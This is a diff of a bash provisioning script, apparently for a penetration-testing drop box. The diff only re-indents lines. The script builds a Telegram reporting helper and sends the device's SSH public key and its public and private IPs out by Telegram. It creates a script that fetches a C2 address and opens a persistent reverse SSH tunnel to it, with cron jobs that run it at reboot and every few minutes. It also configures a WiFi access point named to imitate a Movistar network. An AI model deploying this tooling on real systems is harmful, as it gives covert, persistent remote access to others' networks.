@@ -48,10 +48,10 @@ function initialSetup {
         sysctl -p
     fi
 
-	echo -e "${yellowColor}[*] Creating script /bin/telegram.sh...${resetColor}"
-	read -p "[*] Enter Telegram Bot Token (@BotFather): " token
-	read -p "[*] Enter Telegram User ID (@userinfobot): " id
-	read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
+    echo -e "${yellowColor}[*] Creating script /bin/telegram.sh...${resetColor}"
+    read -p "[*] Enter Telegram Bot Token (@BotFather): " token
+    read -p "[*] Enter Telegram User ID (@userinfobot): " id
+    read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
     echo "#!/bin/bash" >/bin/telegram.sh
     echo "TOKEN="$token"" >>/bin/telegram.sh
     echo "ID="$id"" >>/bin/telegram.sh
@@ -82,35 +82,35 @@ function SSHServer {
 }
 
 function autoSSH {
-	echo -e "${yellowColor}[*] Setting up automatic reverse SSH tunnel...${resetColor}"
-	if ! dpkg -l autossh >/dev/null 2>&1; then
+    echo -e "${yellowColor}[*] Setting up automatic reverse SSH tunnel...${resetColor}"
+    if ! dpkg -l autossh >/dev/null 2>&1; then
         apt-get install autossh -y
     fi
 
-	echo -e "${yellowColor}[*] Generating SSH key pair...${resetColor}"
-	ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y 2>&1 >/dev/null
+    echo -e "${yellowColor}[*] Generating SSH key pair...${resetColor}"
+    ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y 2>&1 >/dev/null
 
-	echo -e "${yellowColor}[*] Sending via Telegram the /root/.ssh/authorized_keys file that has to go in C2...${resetColor}"
-	/bin/telegram.sh "$(cat /root/.ssh/id_rsa.pub)"
+    echo -e "${yellowColor}[*] Sending via Telegram the /root/.ssh/authorized_keys file that has to go in C2...${resetColor}"
+    /bin/telegram.sh "$(cat /root/.ssh/id_rsa.pub)"
 
-	echo -e "${yellowColor}[*] Creating script /bin/autossh-connect.sh...${resetColor}"
-	read -p "[*] Enter URL with SSH connection data (Format: IP:PORT): " urlssh
-	read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
-	echo '#!/bin/bash' >/bin/autossh-connect.sh
-	echo 'output="$(curl -s '"$urlssh"')"' >>/bin/autossh-connect.sh
-	echo 'host="$(echo $output | cut -d: -f1)"' >>/bin/autossh-connect.sh
-	echo 'port="$(echo $output | cut -d: -f2)"' >>/bin/autossh-connect.sh
-	echo '/bin/telegram.sh "$(echo Public IP: $(curl -s ifconfig.co))"' >>/bin/autossh-connect.sh
-	echo '/bin/telegram.sh "$(echo Private IP: $(hostname -I))"' >>/bin/autossh-connect.sh
-	echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port"' >>/bin/autossh-connect.sh
-	chmod +x /bin/autossh-connect.sh
+    echo -e "${yellowColor}[*] Creating script /bin/autossh-connect.sh...${resetColor}"
+    read -p "[*] Enter URL with SSH connection data (Format: IP:PORT): " urlssh
+    read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
+    echo '#!/bin/bash' >/bin/autossh-connect.sh
+    echo 'output="$(curl -s '"$urlssh"')"' >>/bin/autossh-connect.sh
+    echo 'host="$(echo $output | cut -d: -f1)"' >>/bin/autossh-connect.sh
+    echo 'port="$(echo $output | cut -d: -f2)"' >>/bin/autossh-connect.sh
+    echo '/bin/telegram.sh "$(echo Public IP: $(curl -s ifconfig.co))"' >>/bin/autossh-connect.sh
+    echo '/bin/telegram.sh "$(echo Private IP: $(hostname -I))"' >>/bin/autossh-connect.sh
+    echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port"' >>/bin/autossh-connect.sh
+    chmod +x /bin/autossh-connect.sh
 
-	echo -e "${yellowColor}[*] Creating cronjob for autossh...${resetColor}"
-	crontab -l > mycron
-	echo "@reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
-	echo "/5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
-	crontab mycron
-	rm mycron
+    echo -e "${yellowColor}[*] Creating cronjob for autossh...${resetColor}"
+    crontab -l > mycron
+    echo "@reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
+    echo "/5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
+    crontab mycron
+    rm mycron
 }
 
 function routedAP {
@@ -151,28 +151,28 @@ function routedAP {
     echo "domain=wlan" >> /etc/dnsmasq.conf
     echo "address=/gw.wlan/192.168.4.1" >> /etc/dnsmasq.conf
 
-	echo -e "${yellowColor}[*] Enabling the WiFi radio...${resetColor}"
-	rfkill unblock wlan
+    echo -e "${yellowColor}[*] Enabling the WiFi radio...${resetColor}"
+    rfkill unblock wlan
 
-	echo -e "${yellowColor}[*] Creating the hostapd configuration file (AP: MOVISTAR_1337:hacktheplanet)...${resetColor}"
-	echo "country_code=ES" >> /etc/hostapd/hostapd.conf
-	echo "interface=wlan0" >> /etc/hostapd/hostapd.conf
-	echo "ssid=MOVISTAR_1337" >> /etc/hostapd/hostapd.conf
-	echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
-	echo "channel=7" >> /etc/hostapd/hostapd.conf
-	echo "macaddr_acl=0" >> /etc/hostapd/hostapd.conf
-	echo "auth_algs=1" >> /etc/hostapd/hostapd.conf
-	echo "ignore_broadcast_ssid=0" >> /etc/hostapd/hostapd.conf
-	echo "wpa=2" >> /etc/hostapd/hostapd.conf
-	echo "wpa_passphrase=hacktheplanet" >> /etc/hostapd/hostapd.conf
-	echo "wpa_key_mgmt=WPA-PSK" >> /etc/hostapd/hostapd.conf
-	echo "wpa_pairwise=TKIP" >> /etc/hostapd/hostapd.conf
-	echo "rsn_pairwise=CCMP" >> /etc/hostapd/hostapd.conf
+    echo -e "${yellowColor}[*] Creating the hostapd configuration file (AP: MOVISTAR_1337:hacktheplanet)...${resetColor}"
+    echo "country_code=ES" >> /etc/hostapd/hostapd.conf
+    echo "interface=wlan0" >> /etc/hostapd/hostapd.conf
+    echo "ssid=MOVISTAR_1337" >> /etc/hostapd/hostapd.conf
+    echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
+    echo "channel=7" >> /etc/hostapd/hostapd.conf
+    echo "macaddr_acl=0" >> /etc/hostapd/hostapd.conf
+    echo "auth_algs=1" >> /etc/hostapd/hostapd.conf
+    echo "ignore_broadcast_ssid=0" >> /etc/hostapd/hostapd.conf
+    echo "wpa=2" >> /etc/hostapd/hostapd.conf
+    echo "wpa_passphrase=hacktheplanet" >> /etc/hostapd/hostapd.conf
+    echo "wpa_key_mgmt=WPA-PSK" >> /etc/hostapd/hostapd.conf
+    echo "wpa_pairwise=TKIP" >> /etc/hostapd/hostapd.conf
+    echo "rsn_pairwise=CCMP" >> /etc/hostapd/hostapd.conf
 }
 
 function reboot {
-	read -p "Reboot? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
-	shutdown -r now
+    read -p "Reboot? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
+    shutdown -r now
 }
 
 isRoot
